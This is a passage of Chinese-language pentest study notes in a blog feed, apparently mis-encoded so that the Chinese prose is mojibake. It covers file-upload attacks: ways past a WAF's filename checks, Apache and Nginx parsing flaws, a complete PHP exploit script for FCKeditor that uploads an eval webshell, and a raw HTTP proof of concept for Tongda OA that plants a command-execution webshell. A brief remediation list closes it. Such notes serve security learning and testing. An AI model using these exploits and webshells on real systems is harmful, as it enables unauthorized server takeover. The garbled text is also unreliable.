/><p>ç¬¦å·å˜å¼‚-é˜²åŒ¹é…ï¼ˆâ€™ â€œ ;ï¼‰ </p><p>é€šè¿‡åªç”¨ä¸€ä¸ªâ€è¿›è¡ŒåŒ…è£¹æ¥ç»•è¿‡åŒ¹é…ã€‚è¿™é‡Œå•å¼•å·ä¹Ÿå¯ä»¥ã€‚ç»è¿‡æµ‹è¯•å‘ç°å®‰å…¨ç‹—è¿™é‡Œåº”è¯¥æ˜¯é€šè¿‡æ£€æµ‹æœ€åä¸€ä¸ªåŒå¼•å·æˆ–è€…å•å¼•å·çš„ä½ç½®ï¼Œç„¶åå‘å‰å»åŒ¹é…çš„ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115068.png" alt="image-20210905190148958"></p><p>æ•°æ®æˆªæ–­-é˜²åŒ¹é…(%00 ; æ¢è¡Œ)</p><p>ç¬¬ä¸€ç§<code>;</code> </p><p>é€šè¿‡<code>2.png;.php</code>è¿™æ ·çš„æ–¹å¼å¯ä»¥è¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯å‰ææ˜¯å¿…é¡»è¦å•å¼•å·åŒ…è£¹æ‰å¯ä»¥ï¼Œ<code>;</code>åœ¨ä»£ç ä¸­è¡¨ç¤ºç»“æŸçš„æ„æ€ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115273.png" alt="image-20210905191818352"></p><p>ç¬¬äºŒç§<code>%00</code></p><p>è¿™ç§æ–¹æ³•POSTæäº¤éœ€è¦è¿›è¡Œæ‰‹åŠ¨ç¼–ç ï¼Œé€šè¿‡<code>2.php%00.png</code>å½¢å¼ç»•è¿‡ï¼Œ%00è¦ç¼–ç ï¼ŒåŸç†è¿˜æ˜¯è¿›è¡Œæˆªæ–­</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115001.png" alt="image-20210905192300710"></p><p>ç¬¬ä¸‰ç§ æ¢è¡Œ</p><p>è¿™ç§æ–¹æ³•åŒæ„éœ€è¦å•å¼•å·åŒ…è£¹æ‰å¯ä»¥ï¼Œå°†phpè¿›è¡Œæ¢è¡Œï¼Œä»£ç ä¸­å°±ä¼šå½¢æˆ<code>p\nh\np</code>çš„å½¢å¼ï¼Œä»è€Œç»•è¿‡æ£€æµ‹ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114175.png" alt="image-20210905192746615"></p><p>é‡å¤æ•°æ®-é˜²åŒ¹é…(å‚æ•°å¤šæ¬¡)</p><p>ç¬¬ä¸€ç§</p><p>è¿™ç§æ–¹æ³•åŒæ„éœ€è¦å•å¼•å·åŒ…è£¹æ‰å¯ä»¥ï¼Œå†™æˆ<code>filename=&#39;1.png&#39;;filename=&#39;2.php&#39;;</code>è¿™æ ·çš„å½¢å¼å¯ä»¥ç»•è¿‡ï¼ŒåŸç†æ˜¯å®‰å…¨ç‹—åªä¼šæ£€æµ‹ç¬¬ä¸€ä¸ªé‡åˆ°çš„filenameçš„åç¼€ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115732.png" alt="image-20210905194421815"></p><p>ç¬¬äºŒç§ <code>/</code></p><p><code>/</code>ä¹Ÿå¯ä»¥ç»•è¿‡</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114808.png" alt="image-20210905195228972"></p><h4 id="FUZZå­—å…¸"><a href="#FUZZå­—å…¸" class="headerlink" title="FUZZå­—å…¸"></a>FUZZå­—å…¸</h4><p>æ‰‹å·¥æµ‹å¤ªæ…¢äº†ï¼Œä½¿ç”¨å·¥å…·æ¥æµ‹è¯•</p><p>éœ€è¦æœ‰FUZZå­—å…¸ï¼Œç„¶åè¿›è¡Œå­—å…¸çˆ†ç ´ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fuzzdb-project/fuzzdb</span><br><span class="line">https://github.com/TheKingOfDuck/fuzzDicts</span><br></pre></td></tr></table></figure><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211115945.png" alt="image-20210905203026858" style="zoom:80%;" /><h3 id="æ–‡ä»¶ä¸Šä¼ å®‰å…¨ä¿®å¤æ–¹æ¡ˆ"><a href="#æ–‡ä»¶ä¸Šä¼ å®‰å…¨ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å®‰å…¨ä¿®å¤æ–¹æ¡ˆ"></a>æ–‡ä»¶ä¸Šä¼ å®‰å…¨ä¿®å¤æ–¹æ¡ˆ</h3><ul><li><p>åç«¯éªŒè¯ï¼šé‡‡ç”¨æœåŠ¡ç«¯éªŒè¯æ¨¡å¼</p></li><li><p>åç¼€æ£€æµ‹ï¼šåŸºäºé»‘åå•ï¼Œç™½åå•è¿‡æ»¤ </p></li><li><p>MIME æ£€æµ‹ï¼šåŸºäºä¸Šä¼ è‡ªå¸¦ç±»å‹æ£€æµ‹ </p></li><li><p>å†…å®¹æ£€æµ‹ï¼šæ–‡ä»¶å¤´ï¼Œå®Œæ•´æ€§æ£€æµ‹</p></li><li><p>è‡ªå¸¦å‡½æ•°è¿‡æ»¤ï¼šå‚è€ƒ uploadlabs å‡½æ•° </p></li><li><p>è‡ªå®šä¹‰å‡½æ•°è¿‡æ»¤ï¼šfunction check_file(){} </p></li><li><p>WAF é˜²æŠ¤äº§å“ï¼šå®å¡”ï¼Œäº‘ç›¾ï¼Œå®‰å…¨å…¬å¸äº§å“ç­‰</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23WEBæ¼æ´-æ–‡ä»¶ä¸Šä¼ ä¹‹è§£ææ¼æ´ç¼–è¾‘å™¨å®‰å…¨</title>
      <link href="/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/"/>
      <url>/2021/09/21/23WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="apacheä½ç‰ˆæœ¬è§£ææ¼æ´"><a href="#apacheä½ç‰ˆæœ¬è§£ææ¼æ´" class="headerlink" title="apacheä½ç‰ˆæœ¬è§£ææ¼æ´"></a>apacheä½ç‰ˆæœ¬è§£ææ¼æ´</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>Apache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚ test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠxxxx.php.owf.rarè§£ææˆphpã€‚</p><h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114375.png" alt="image-20210904210637550"></p><h3 id="Apache-HTTPD-å¤šåç¼€è§£ææ¼æ´"><a href="#Apache-HTTPD-å¤šåç¼€è§£ææ¼æ´" class="headerlink" title="Apache HTTPD å¤šåç¼€è§£ææ¼æ´"></a>Apache HTTPD å¤šåç¼€è§£ææ¼æ´</h3><p>Apache HTTPD æ”¯æŒä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªåç¼€ï¼Œå¹¶ä¸ºä¸åŒåç¼€æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ã€‚æ¯”å¦‚ï¼Œå¦‚ä¸‹é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure><p>å…¶ç»™<code>.html</code>åç¼€å¢åŠ äº†media-typeï¼Œå€¼ä¸º<code>text/html</code>ï¼›ç»™<code>.cn</code>åç¼€å¢åŠ äº†è¯­è¨€ï¼Œå€¼ä¸º<code>zh-CN</code>ã€‚æ­¤æ—¶ï¼Œå¦‚æœç”¨æˆ·è¯·æ±‚æ–‡ä»¶<code>index.cn.html</code>ï¼Œä»–å°†è¿”å›ä¸€ä¸ªä¸­æ–‡çš„htmlé¡µé¢ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯Apacheå¤šåç¼€çš„ç‰¹æ€§ã€‚å¦‚æœè¿ç»´äººå‘˜ç»™<code>.php</code>åç¼€å¢åŠ äº†å¤„ç†å™¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆï¼Œåœ¨æœ‰å¤šä¸ªåç¼€çš„æƒ…å†µä¸‹ï¼Œåªè¦ä¸€ä¸ªæ–‡ä»¶å«æœ‰<code>.php</code>åç¼€çš„æ–‡ä»¶å³å°†è¢«è¯†åˆ«æˆPHPæ–‡ä»¶ï¼Œæ²¡å¿…è¦æ˜¯æœ€åä¸€ä¸ªåç¼€ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå°†ä¼šé€ æˆä¸€ä¸ªå¯ä»¥ç»•è¿‡ä¸Šä¼ ç™½åå•çš„è§£ææ¼æ´ã€‚</p><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114213.png" alt="image-20210904214801259"></p><h3 id="Apache-HTTPD-æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"><a href="#Apache-HTTPD-æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰" class="headerlink" title="Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰"></a>Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰</h3><p>Apache HTTPDæ˜¯ä¸€æ¬¾HTTPæœåŠ¡å™¨ï¼Œå®ƒå¯ä»¥é€šè¿‡mod_phpæ¥è¿è¡ŒPHPç½‘é¡µã€‚å…¶2.4.0~2.4.29ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªè§£ææ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ<code>1.php\x0A</code>å°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚</p><h4 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114804.png" alt="image-20210905145202655"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114227.png" alt="image-20210905145220127"></p><p>è®¿é—®åˆšæ‰ä¸Šä¼ çš„<code>/1.php%0a</code>ï¼Œå‘ç°èƒ½å¤ŸæˆåŠŸè§£æï¼Œä½†è¿™ä¸ªæ–‡ä»¶ä¸æ˜¯phpåç¼€ï¼Œè¯´æ˜ç›®æ ‡å­˜åœ¨è§£ææ¼æ´ï¼š</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114744.png" alt="image-20210905145338522"></p><h3 id="Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"><a href="#Nginx-æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰" class="headerlink" title="Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰"></a>Nginx æ–‡ä»¶åé€»è¾‘æ¼æ´ï¼ˆCVE-2013-4547ï¼‰</h3><h4 id="å½±å“ç‰ˆæœ¬ï¼š"><a href="#å½±å“ç‰ˆæœ¬ï¼š" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼š"></a>å½±å“ç‰ˆæœ¬ï¼š</h4><p>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.werner.wiki/file-resolution-vulnerability-nginx/</span><br></pre></td></tr></table></figure><h4 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ª1.pngçš„å›¾ç‰‡é©¬ï¼Œä¸Šä¼ çš„æ—¶å€™è¦åœ¨1.pngåé¢åŠ ä¸Šä¸€ä¸ªç©ºæ ¼(windowsåˆ™ä¸éœ€è¦)ï¼Œä¹‹åæ­£å¸¸ä¸Šä¼ ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114922.png" alt="image-20210905154843231"></p><p>ä¹‹åè®¿é—®è¿™ä¸ªå›¾ç‰‡ï¼Œè®¿é—®çš„æ—¶å€™è¦æŠ“åŒ…ï¼Œå°†åç¼€ä¿®æ”¹ä¸º<code>http://your-ip:8080/uploadfiles/1.png[0x20][0x00].php</code>ï¼Œå³å¯å‘ç°PHPå·²è¢«è§£æã€‚</p><p>é¦–å…ˆå…ˆåœ¨pngåé¢åŠ <code>...php</code></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114860.png" alt="image-20210905155452913"></p><p>ç„¶åå»hexä¸­è¿›è¡Œä¿®æ”¹ï¼Œå°†pngå‰ä¿©ä¸ªç‚¹ä¿®æ”¹ä¸º20å’Œ00.</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114138.png" alt="image-20210905155625642"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114897.png" alt="image-20210905155819496"></p><p>å‘é€ä»¥åï¼Œæˆ‘è¿”å›200ï¼ŒæˆåŠŸè§£æphpä»£ç ã€‚</p><h3 id="WEB-ç¼–è¾‘å™¨"><a href="#WEB-ç¼–è¾‘å™¨" class="headerlink" title="WEB ç¼–è¾‘å™¨"></a>WEB ç¼–è¾‘å™¨</h3><p>ç½‘ç«™åå°ä¸­ç»å¸¸ä¼šæœ‰æ·»åŠ æ–‡å­—å†…å®¹è¿™ç±»åŠŸèƒ½ï¼Œè€Œè¿™ä¸€åŠŸèƒ½æœ‰æ—¶å€™ä¼šä½¿ç”¨webç¼–è¾‘å™¨æ¥å®Œæˆã€‚WEBç¼–è¾‘å™¨å¯ä»¥å¯¹æ–‡å­—ã€å›¾ç‰‡ã€éŸ³é¢‘ç­‰å†…å®¹è¿›è¡Œå¤„ç†ã€‚è€Œè¿™äº›WEBç¼–è¾‘å™¨å­˜åœ¨ä¸€äº›å®‰å…¨é—®é¢˜ï¼Œå¦‚æœæˆ‘ä»¬çŸ¥é“äº†è¯¥ç¼–è¾‘å™¨çš„åå­—å’Œç‰ˆæœ¬ï¼Œå°±å¯ä»¥é€šè¿‡æœç´¢å¾—çŸ¥ä»–çš„å…·ä½“æ¼æ´æƒ…å†µã€‚</p><p>ä¸€èˆ¬é€šè¿‡æ‰«æç½‘ç«™è·¯å¾„æ¥è·å–ç¼–è¾‘å™¨ä¿¡æ¯ã€‚</p><h4 id="ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ"><a href="#ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ"></a>ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://navisec.it/ç¼–è¾‘å™¨æ¼æ´æ‰‹å†Œ/</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114902.png" alt="image-20210905162111734"></p><h4 id="fckeditor263"><a href="#fckeditor263" class="headerlink" title="fckeditor263"></a>fckeditor263</h4><p>è¿™é‡Œä»¥fckeditor263ä¸ºä¾‹è¿›è¡Œæ¼”ç¤º</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&quot;default_socket_timeout&quot;</span>, <span class="number">5</span>);</span><br><span class="line">define(STDIN, fopen(<span class="string">&quot;php://stdin&quot;</span>, <span class="string">&quot;r&quot;</span>));</span><br><span class="line"><span class="variable">$match</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">http_send</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$packet</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>);</span><br><span class="line"><span class="keyword">while</span> (!<span class="variable">$sock</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n[-] No response from <span class="subst">&#123;$host&#125;</span>:80 Trying again...&quot;</span>;</span><br><span class="line"><span class="variable">$sock</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>);</span><br><span class="line">&#125;</span><br><span class="line">fputs(<span class="variable">$sock</span>, <span class="variable">$packet</span>);</span><br><span class="line"><span class="keyword">while</span> (!feof(<span class="variable">$sock</span>)) <span class="variable">$resp</span> .= fread(<span class="variable">$sock</span>, <span class="number">1024</span>);</span><br><span class="line">fclose(<span class="variable">$sock</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$resp</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">connector_response</span>(<span class="params"><span class="variable">$html</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$match</span>;</span><br><span class="line"><span class="keyword">return</span> (preg_match(<span class="string">&quot;/OnUploadCompleted\((\d),\&quot;(.*)\&quot;\)/&quot;</span>, <span class="variable">$html</span>, <span class="variable">$match</span>) &amp;&amp; in_array(<span class="variable">$match</span>[<span class="number">1</span>], <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">201</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n+------------------------------------------------------------------+&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n| FCKEditor Servelet Arbitrary File Upload Exploit |&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n+------------------------------------------------------------------+\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$argc</span> &lt; <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nUsage......: php <span class="subst">$argv</span>[0] host path\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nExample....: php <span class="subst">$argv</span>[0] localhost /\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\nExample....: php <span class="subst">$argv</span>[0] localhost /FCKEditor/\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$path</span> = ereg_replace(<span class="string">&quot;(/)&#123;2,&#125;&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="variable">$argv</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;fvck.gif&quot;</span>;</span><br><span class="line"><span class="variable">$foldername</span> = <span class="string">&quot;fuck.php%00.gif&quot;</span>;</span><br><span class="line"><span class="variable">$connector</span> = <span class="string">&quot;editor/filemanager/connectors/php/connector.php&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;-----------------------------265001916915724\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&quot;Content-Disposition: form-data; name=\&quot;NewFile\&quot;; filename=\&quot;<span class="subst">&#123;$filename&#125;</span>\&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&quot;Content-Type: image/jpeg\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;&lt;?php eval($_POST[cmd]) ?&gt;&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span> .= <span class="string">&quot;-----------------------------265001916915724--\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> = <span class="string">&quot;POST <span class="subst">&#123;$path&#125;</span><span class="subst">&#123;$connector&#125;</span>?Command=FileUpload&amp;Type=Image&amp;CurrentFolder=&quot;</span>.<span class="variable">$foldername</span>.<span class="string">&quot; HTTP/1.0\r\n&quot;</span>;<span class="comment">//print $packet;</span></span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Host: <span class="subst">&#123;$host&#125;</span>\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Content-Length: &quot;</span>.strlen(<span class="variable">$payload</span>).<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$packet</span> .= <span class="variable">$payload</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$packet</span>;</span><br><span class="line"><span class="keyword">if</span> (!connector_response(http_send(<span class="variable">$host</span>, <span class="variable">$packet</span>))) <span class="keyword">die</span>(<span class="string">&quot;\n[-] Upload failed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">&quot;\n[-] Job done! try http://$&#123;host&#125;/<span class="subst">$match</span>[2] \n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨</strong></p><p>é€šè¿‡æ‰§è¡Œè„šæœ¬è¿›è¡Œåˆ©ç”¨,åˆ©ç”¨éœ€è¦çŸ¥é“WEBç¼–è¾‘å™¨çš„è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php fck.php 127.0.0.1:8080 /fckeditor263/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114402.png" alt="image-20210905162419415"></p><h3 id="CMS-æ–‡ä»¶ä¸Šä¼ "><a href="#CMS-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="CMS æ–‡ä»¶ä¸Šä¼ "></a>CMS æ–‡ä»¶ä¸Šä¼ </h3><p>è¯†åˆ«ç½‘ç«™CMSåè¯¥æ€ä¹ˆåŠï¼Ÿä»¥é€šè¾¾OA CMSä¸ºä¾‹</p><h4 id="é€šè¾¾OA-CMS-V11ç‰ˆæœ¬"><a href="#é€šè¾¾OA-CMS-V11ç‰ˆæœ¬" class="headerlink" title="é€šè¾¾OA CMS(V11ç‰ˆæœ¬)"></a>é€šè¾¾OA CMS(V11ç‰ˆæœ¬)</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114956.png" alt="image-20210905165220547"></p><h5 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h5><p>è·¯å¾„ä¸ºï¼šispirit/im/upload.php</p><p>æŠ“åŒ…æ„é€ POCï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: localhost:999</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5</span><br><span class="line">Cookie: PHPSESSID=123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 660</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><br><span class="line">2</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;P&quot;</span><br><span class="line">123</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundarypyfBh1YB4pV8McGB</span><br><span class="line">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">$wsh = new COM(&#x27;WScript.shell&#x27;);</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211114321.png" 